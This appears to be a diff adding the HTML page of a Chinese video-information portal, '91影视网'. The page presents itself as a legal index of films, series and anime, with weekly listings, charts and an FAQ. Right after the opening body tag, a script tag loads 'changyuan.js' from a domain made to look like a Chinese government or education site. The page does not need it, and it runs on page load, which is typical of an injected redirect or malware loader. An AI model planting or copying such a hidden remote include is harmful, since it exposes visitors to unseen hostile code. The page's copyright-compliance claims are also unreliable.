@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+<meta name="bingbot" content="index,follow">
+<meta name="language" content="zh-CN">
+<meta name="geo.region" content="CN">
+<meta name="description" content="91影视网（91yingshiwang.top.github.io）是中文互联网上的影视信息导航与观看指引站点，收录院线电影、国产剧集、网络剧、纪录片、动漫、综艺、短剧与海外剧的播出信息，按清晰度、更新状态、播放源类型、字幕语言与上线时间做多维筛选。网站同时提供每周新片速递、热播榜单、类型片索引、播放问题解决与版权合规说明，帮助用户快速定位正版播放页面，减少在不同平台之间反复搜索的时间。">
+<meta name="keywords" content="91影视网,91yingshiwang.top.github.io,影视信息导航,院线电影资讯,国产剧集更新,网络剧推荐,纪录片索引,动漫新番,综艺节目单,微短剧排行,海外剧集,高清蓝光,中文字幕,正版播放平台,视频播放源,每周新片速递,热播榜单">
+<link rel="canonical" href="https://91yingshiwang.top.github.io/">
+<title>91影视网 — 影视信息导航与观看指引 · 新片速递 · 热播榜单 · 类型索引 | 91yingshiwang.top.github.io</title>
+<style>
+:root{--paper:#fffdf8;--ink:#171614;--mid:#4a473f;--mut:#8b8575;--line:#e6e1d4;--lineb:#d8d1be;--teal:#0f7b6c;--orange:#e0701f;--plum:#7a3b6e;--sky:#e8f2ef;--orangebg:#fdf0e4;--plumbg:#f6eff5;--shadow:0 1px 0 rgba(0,0,0,.04),0 8px 22px rgba(23,22,20,.07)}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{background:var(--paper);color:var(--ink);font:15px/1.85 "Helvetica Neue",Arial,"PingFang SC","Microsoft YaHei",sans-serif}
+img,svg,button{display:block}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{width:min(1180px,93vw);margin:0 auto}
+/* 导航 */
+.navbar{border-bottom:3px solid var(--ink);position:sticky;top:0;background:var(--paper);z-index:40}
+.navbar .wrap{display:flex;align-items:stretch;height:58px;gap:6px}
+.brand{display:flex;align-items:center;font:800 21px/1 "Helvetica Neue",Arial,sans-serif;letter-spacing:.5px;padding-right:18px}
+.brand i{font-style:normal;color:var(--teal);font-size:12px;letter-spacing:2px;display:block;margin-top:4px;font-weight:700}
+.menu-btn{display:none;margin-left:auto;background:none;border:1px solid var(--lineb);padding:0 14px;cursor:pointer;font-size:13px}
+.tabs{display:flex;margin-left:auto}
+.tabs a{padding:0 15px;display:flex;align-items:center;font-size:14px;color:var(--mid);border-bottom:3px solid transparent;margin-bottom:-3px}
+.tabs a:hover{color:var(--teal);border-bottom-color:var(--teal)}
+/* 横幅 */
+.masthead{padding:40px 0 26px;border-bottom:1px solid var(--line)}
+.masthead .kicker{font:700 12px/1 "Helvetica Neue",Arial,sans-serif;letter-spacing:3px;color:var(--teal);text-transform:uppercase}
+.masthead h1{font:800 clamp(30px,6.4vw,56px)/1.12 "Helvetica Neue",Arial,sans-serif;margin:14px 0 16px;letter-spacing:-.5px}
+.masthead h1 em{font-style:normal;color:var(--orange)}
+.masthead p{color:var(--mid);max-width:62ch;text-align:justify}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--lineb);border:1px solid var(--lineb);margin-top:26px}
+.stats div{background:var(--paper);padding:14px 16px}
+.stats b{display:block;font:800 22px/1.2 "Helvetica Neue",Arial,sans-serif;color:var(--teal)}
+.stats span{font-size:12.5px;color:var(--mut)}
+/* 章节 */
+section{padding:44px 0 8px;scroll-margin-top:66px}
+.head{display:flex;align-items:center;gap:14px;margin-bottom:22px}
+.head .tag{background:var(--ink);color:#fff;font:700 12px/1 "Helvetica Neue",Arial,sans-serif;padding:6px 10px;letter-spacing:1px}
+.head h2{font:800 clamp(19px,3.6vw,27px)/1.3 "Helvetica Neue",Arial,sans-serif}
+.head .rule{flex:1;height:2px;background:var(--lineb)}
+/* 横向滑动看板 */
+.scroller{display:flex;gap:16px;overflow-x:auto;scroll-snap-type:x mandatory;padding:4px 2px 18px;scrollbar-color:var(--lineb) transparent}
+.scroller::-webkit-scrollbar{height:8px}
+.scroller::-webkit-scrollbar-thumb{background:var(--lineb);border-radius:4px}
+.card{flex:0 0 clamp(250px,62vw,340px);scroll-snap-align:start;border:1px solid var(--lineb);background:#fff;box-shadow:var(--shadow);display:flex;flex-direction:column}
+.card .mosaic{height:150px;display:grid;grid-template-columns:1.4fr 1fr;grid-template-rows:1fr 1fr;gap:3px;padding:3px;background:var(--line)}
+.card .mosaic i{background:var(--sky);display:block}
+.card .mosaic i:nth-child(2){background:var(--orangebg)}
+.card .mosaic i:nth-child(3){background:var(--plumbg)}
+.card .mosaic i:nth-child(4){background:#eef1e8}
+.card .body{padding:15px 17px 17px;flex:1;display:flex;flex-direction:column}
+.card h3{font-size:16.5px;font-weight:800;line-height:1.4;margin-bottom:8px}
+.card p{font-size:13.5px;color:var(--mid);flex:1}
+.card .foot{margin-top:12px;display:flex;justify-content:space-between;font-size:11.5px;color:var(--mut);border-top:1px dashed var(--lineb);padding-top:9px}
+.chip{display:inline-block;background:var(--teal);color:#fff;font-size:11px;padding:2px 8px;margin-right:5px}
+/* 分栏对照 */
+.two{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.pane{border:1px solid var(--lineb);background:#fff}
+.pane h4{padding:13px 18px;font-size:15px;font-weight:800;border-bottom:1px solid var(--lineb);display:flex;justify-content:space-between}
+.pane h4 span{font:700 11px/1.8 "Helvetica Neue",Arial,sans-serif;color:var(--mut);letter-spacing:1px}
+.pane ol{counter-reset:r;padding:6px 0}
+.pane li{counter-increment:r;display:flex;gap:12px;padding:11px 18px;border-bottom:1px dashed var(--line);font-size:14px}
+.pane li:last-child{border-bottom:0}
+.pane li::before{content:counter(r,decimal-leading-zero);font:800 13px/1.9 "Helvetica Neue",Arial,sans-serif;color:var(--teal);width:26px;flex:none}
+.pane li b{color:var(--orange);font-size:12px;margin-left:auto;flex:none;font-weight:700}
+/* 马赛克类型索引 */
+.grid9{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+.tile{padding:18px 16px;background:#fff;border:1px solid var(--lineb);min-height:118px;display:flex;flex-direction:column;justify-content:space-between;transition:.2s}
+.tile:hover{border-color:var(--teal);transform:translateY(-3px);box-shadow:var(--shadow)}
+.tile strong{font-size:16px;font-weight:800}
+.tile span{font-size:12.5px;color:var(--mut);line-height:1.6}
+.tile.c2{grid-column:span 2;background:var(--sky);border-color:#cfe3de}
+.tile.c3{background:var(--orangebg);border-color:#f2dcc2}
+.tile.c4{background:var(--plumbg);border-color:#e7d6e3}
+/* 折叠问答 */
+.acc{border:1px solid var(--lineb);background:#fff}
+.acc details{border-bottom:1px solid var(--lineb)}
+.acc details:last-child{border-bottom:0}
+.acc summary{cursor:pointer;padding:16px 20px;font-weight:700;font-size:15px;list-style:none;display:flex;gap:12px;align-items:center}
+.acc summary::-webkit-details-marker{display:none}
+.acc summary::before{content:"+";font:800 18px/1 "Helvetica Neue",Arial,sans-serif;color:var(--teal);width:18px}
+.acc details[open] summary::before{content:"–"}
+.acc summary .qnum{font:800 12px/1 "Helvetica Neue",Arial,sans-serif;color:var(--orange);letter-spacing:1px}
+.acc .ans{padding:0 20px 18px 52px;color:var(--mid);font-size:14px;text-align:justify}
+.acc .ans code{background:var(--line);padding:1px 6px;font-size:13px}
+/* 页脚 */
+footer{margin-top:52px;background:var(--ink);color:#ddd8c9;padding:42px 0 20px}
+footer .wrap{display:grid;grid-template-columns:1.5fr repeat(3,1fr);gap:26px}
+footer h5{color:#fff;font:800 14px/1 "Helvetica Neue",Arial,sans-serif;margin-bottom:14px;letter-spacing:.5px}
+footer ul li{padding:6px 0;font-size:13.5px;color:#b8b2a1}
+footer ul a:hover{color:var(--orange)}
+footer .big{font:800 26px/1.2 "Helvetica Neue",Arial,sans-serif;color:#fff}
+footer .big em{font-style:normal;color:var(--teal);font-size:13px;display:block;margin-top:8px;letter-spacing:1px;font-weight:700}
+.legal{border-top:1px solid #3a372e;margin-top:28px;padding-top:16px;font-size:12.5px;color:#978f7c;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px}
+.legal address{font-style:normal}
+.up{position:fixed;right:14px;bottom:16px;width:44px;height:44px;border:1px solid var(--lineb);background:var(--paper);font:800 18px/44px;text-align:center;cursor:pointer;opacity:0;pointer-events:none;transition:.25s;z-index:60}
+.up.on{opacity:1;pointer-events:auto}
+@media(max-width:900px){.stats{grid-template-columns:repeat(2,1fr)}.two{grid-template-columns:1fr}.grid9{grid-template-columns:repeat(2,1fr)}.tile.c2,.tile.c3,.tile.c4{grid-column:span 1;background:#fff}.footer-grid{grid-template-columns:1fr 1fr}}
+@media(max-width:660px){.tabs{display:none;position:absolute;left:0;right:0;top:58px;flex-direction:column;background:var(--paper);border-bottom:1px solid var(--lineb);box-shadow:0 10px 20px rgba(0,0,0,.08)}.tabs.show{display:flex}.tabs a{border-bottom:1px solid var(--line);padding:14px 5vw}.menu-btn{display:block}.navbar .wrap{position:relative}.grid9{grid-template-columns:1fr}.masthead{padding:26px 0 20px}.acc summary{padding:14px 16px;font-size:14px}.acc .ans{padding-left:40px}}
+@media print{.navbar,.up,.menu-btn{display:none}body{background:#fff}.card,.pane,.tile{box-shadow:none}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="navbar">
+  <div class="wrap">
+    <div class="brand">91影视网<em>91YINGSHIWANG</em></div>
+    <nav class="tabs" id="tabs">
+      <a href="#speed">每周新片</a>
+      <a href="#chart">热播榜单</a>
+      <a href="#genre">类型索引</a>
+      <a href="#help">常见问题</a>
+    </nav>
+    <button class="menu-btn" id="mb">菜单 ☰</button>
+  </div>
+</div>
+
+<header class="masthead wrap">
+  <div class="kicker">Video Information &amp; Navigation / 中文影视信息导航</div>
+  <h1>91影视网：把分散在几十个平台的<br><em>影视播出信息</em>，整理成一张可筛选的清单</h1>
+  <p>从院线排片到网络剧更新，从纪录片排播到短剧上新：91影视网不做内容存储，只做信息整理与正版入口指引，帮你在选择之前先看清作品的类型、清晰度、更新状态、字幕语言与上线时间。</p>
+  <div class="stats">
+    <div><b>7</b><span>覆盖内容形态</span></div>
+    <div><b>5</b><span>筛选维度</span></div>
+    <div><b>每周</b><span>新片速递更新频率</span></div>
+    <div><b>正版</b><span>仅指向合规播放平台</span></div>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section id="speed">
+    <div class="head"><span class="tag">栏目 01</span><h2>每周新片速递</h2><div class="rule"></div></div>
+    <div class="scroller">
+      <article class="card">
+        <div class="mosaic"><i></i><i></i><i></i><i></i></div>
+        <div class="body">
+          <span class="chip">院线</span><span class="chip">本周新增</span>
+          <h3>院线电影：本周新上映 6 部，国产剧情片占 3 部</h3>
+          <p>本周新片集中在家庭与悬疑两条线上，其中两部为导演第二部长片，适合对照观看。</p>
+          <div class="foot"><span>更新：2026-10-26</span><span>格式：院线排片</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="mosaic"><i></i><i></i><i></i><i></i></div>
+        <div class="body">
+          <span class="chip">国产剧</span><span class="chip">连载中</span>
+          <h3>国产剧集：周三、周五双更模式占比上升</h3>
+          <p>本季度上线的国产剧多为 24 集以内，更新节奏比上季度稳定，断更情况减少。</p>
+          <div class="foot"><span>更新：每日</span><span>格式：集数＋更新日</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="mosaic"><i></i><i></i><i></i><i></i></div>
+        <div class="body">
+          <span class="chip">网络剧</span><span class="chip">全集上线</span>
+          <h3>网络剧：一次性全集上线成为悬疑类主流</h3>
+          <p>悬疑与犯罪题材倾向全集放出，青春与都市题材仍保留周更，便于话题发酵。</p>
+          <div class="foot"><span>更新：每周一</span><span>格式：上线模式</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="mosaic"><i></i><i></i><i></i><i></i></div>
+        <div class="body">
+          <span class="chip">动漫</span><span class="chip">季度番</span>
+          <h3>动漫新番：十月番进入第二周，续作占四成</h3>
+          <p>本季续作比例偏高，新作中以异世界与职场题材为主，剧场版陆续定档冬季。</p>
+          <div class="foot"><span>更新：每周四</span><span>格式：季度＋集数</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="mosaic"><i></i><i></i><i></i><i></i></div>
+        <div class="body">
+          <span class="chip">纪录片</span><span class="chip">单集独立</span>
+          <h3>纪录片：自然与历史两条线同步更新</h3>
+          <p>单集独立成篇，可跳集观看；部分系列配有中英文字幕，适合做资料检索。</p>
+          <div class="foot"><span>更新：双周</span><span>格式：单集＋主题</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="mosaic"><i></i><i></i><i></i><i></i></div>
+        <div class="body">
+          <span class="chip">短剧</span><span class="chip">竖屏</span>
+          <h3>微短剧：竖屏内容进入平台分账阶段</h3>
+          <p>集数多在 20 集以内，题材集中在都市情感与逆袭，单集时长 1 至 3 分钟。</p>
+          <div class="foot"><span>更新：每日</span><span>格式：集数＋单集时长</span></div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <section id="chart">
+    <div class="head"><span class="tag">栏目 02</span><h2>本周热播榜单</h2><div class="rule"></div></div>
+    <div class="two">
+      <div class="pane">
+        <h4>综合热度榜 <span>TOP 5</span></h4>
+        <ol>
+          <li>都市职场剧：第二季收官，讨论集中在结局处理<b>完结</b></li>
+          <li>悬疑网络剧：全集上线第三天热度登顶<b>全集</b></li>
+          <li>院线电影：上映第二周票房逆跌<b>热映</b></li>
+          <li>历史纪录片：单集独立，检索价值高<b>更新中</b></li>
+          <li>海外剧集：中文字幕同步上线<b>同步</b></li>
+        </ol>
+      </div>
+      <div class="pane">
+        <h4>观众口碑榜 <span>按评分</span></h4>
+        <ol>
+          <li>国产家庭剧：节奏平稳，适合合家观看<b>8.4</b></li>
+          <li>日本电影：小成本作品，海外发行版已上线<b>8.1</b></li>
+          <li>纪录电影：自然题材，片长 96 分钟<b>7.9</b></li>
+          <li>漫改真人版：还原度高，粉丝向<b>7.6</b></li>
+          <li>综艺节目：谈话类，固定嘉宾阵容<b>7.3</b></li>
+        </ol>
+      </div>
+    </div>
+  </section>
+
+  <section id="genre">
+    <div class="head"><span class="tag">栏目 03</span><h2>类型片索引</h2><div class="rule"></div></div>
+    <div class="grid9">
+      <div class="tile c2"><strong>剧情 / 家庭</strong><span>本季主力类型，集数集中在 24 集以内，适合按周追更。</span></div>
+      <div class="tile"><strong>悬疑 / 犯罪</strong><span>多为全集上线，支持一次性看完。</span></div>
+      <div class="tile"><strong>喜剧 / 轻喜</strong><span>单集独立，通勤场景观看占比高。</span></div>
+      <div class="tile"><strong>动作 / 军事</strong><span>院线与网络电影主力，侧重视觉呈现。</span></div>
+      <div class="tile c3"><strong>科幻 / 奇幻</strong><span>制作成本分化明显，建议先看预告再决定是否追。</span></div>
+      <div class="tile c4"><strong>纪录片 / 纪实</strong><span>单集独立成篇，适合资料检索与教学引用。</span></div>
+      <div class="tile"><strong>动漫 / 番剧</strong><span>按季度更新，续作比例约四成。</span></div>
+      <div class="tile"><strong>综艺 / 真人秀</strong><span>固定档期，适合按嘉宾筛选。</span></div>
+      <div class="tile"><strong>微短剧</strong><span>竖屏为主，单集 1–3 分钟，集数少。</span></div>
+    </div>
+  </section>
+
+  <section id="help">
+    <div class="head"><span class="tag">栏目 04</span><h2>常见问题与使用说明</h2><div class="rule"></div></div>
+    <div class="acc">
+      <details open>
+        <summary><span class="qnum">Q01</span>91影视网提供视频播放或下载吗？</summary>
+        <div class="ans">不提供。91影视网只整理作品的播出信息，并指向拥有版权的正版播放平台，本站不存储、不转码、不提供下载、网盘与云播服务。</div>
+      </details>
+      <details>
+        <summary><span class="qnum">Q02</span>页面上的"清晰度"和"字幕语言"信息从哪来？</summary>
+        <div class="ans">来自各正版平台的公开说明页。不同平台的标注方式不同，实际以播放页显示为准；本页用 <code>1080P / 4K / 中文字幕</code> 等统一标签方便比较。</div>
+      </details>
+      <details>
+        <summary><span class="qnum">Q03</span>为什么有的作品只写了"已上线"没有写具体平台？</summary>
+        <div class="ans">版权存在地区与时段差异，部分作品的上线范围会随合同变化。遇到这种情况，建议直接在常用正版平台内搜索作品名。</div>
+      </details>
+      <details>
+        <summary><span class="qnum">Q04</span>榜单和排期多久更新一次？</summary>
+        <div class="ans">新片速递每周一更新，热播榜单每周三更新，院线信息随排片变动补充。页面上的"更新"字段标注了每项内容的时间。</div>
+      </details>
+      <details>
+        <summary><span class="qnum">Q05</span>如何按清晰度、类型、地区三个维度同时筛选？</summary>
+        <div class="ans">先用"类型索引"确定题材，再看对应卡片里的清晰度标签，最后按地区标签判断是否需要字幕。三步可以组合使用。</div>
+      </details>
+      <details>
+        <summary><span class="qnum">Q06</span>发现信息有误或版权信息过期怎么办？</summary>
+        <div class="ans">可以通过页脚的联络地址反馈，我们会在一周内核对并更正；涉及版权争议的条目会先下架，核实后再决定是否恢复。</div>
+      </details>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap footer-grid">
+    <div>
+      <div class="big">91影视网<em>91YINGSHIWANG · VIDEO INFO NAV</em></div>
+      <p style="margin-top:14px;font-size:13.5px;color:#b8b2a1;max-width:38ch">中文影视信息导航与观看指引：院线、剧集、动漫、纪录片、综艺、短剧与海外剧，按五个维度筛选。</p>
+    </div>
+    <div><h5>内容栏目</h5><ul><li><a href="#speed">每周新片速递</a></li><li><a href="#chart">本周热播榜单</a></li><li><a href="#genre">类型片索引</a></li><li><a href="#help">常见问题</a></li></ul></div>
+    <div><h5>筛选维度</h5><ul><li>清晰度：1080P / 4K / 蓝光</li><li>字幕：中文 / 中英双语</li><li>更新：连载 / 全集 / 完结</li><li>地区：国产 / 日韩 / 欧美</li></ul></div>
+    <div><h5>站点信息</h5><ul><li>网站名称：91影视网</li><li>内容性质：信息索引与指引</li><li>更新频率：每周一至周三</li><li><address>联络：contact@91yingshiwang.top.github.io</address></li></ul></div>
+  </div>
+  <div class="wrap legal">
+    <span>© <span id="yr"></span> 91影视网 · 索引页域名：https://91yingshiwang.top.github.io · 仅作信息整理，不提供影视资源存储与播放</span>
+    <span>支持正版 · 尊重版权 · 请前往持有版权的平台观看</span>
+  </div>
+</footer>
+
+<button class="up" id="up" aria-label="回到顶部">↑</button>
+
+<script>
+(function(){
+  var mb=document.getElementById('mb'),tabs=document.getElementById('tabs');
+  mb.addEventListener('click',function(){tabs.classList.toggle('show');});
+  tabs.addEventListener('click',function(e){if(e.target.tagName==='A')tabs.classList.remove('show');});
+  var up=document.getElementById('up');
+  window.addEventListener('scroll',function(){up.classList.toggle('on',window.scrollY>460);});
+  up.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.getElementById('yr').textContent=new Date().getFullYear();
+  var sc=document.querySelector('.scroller'),cards=sc.querySelectorAll('.card');
+  cards.forEach(function(c,i){c.style.animation='none';});
+})();
+</script>
+</body>
+</html>
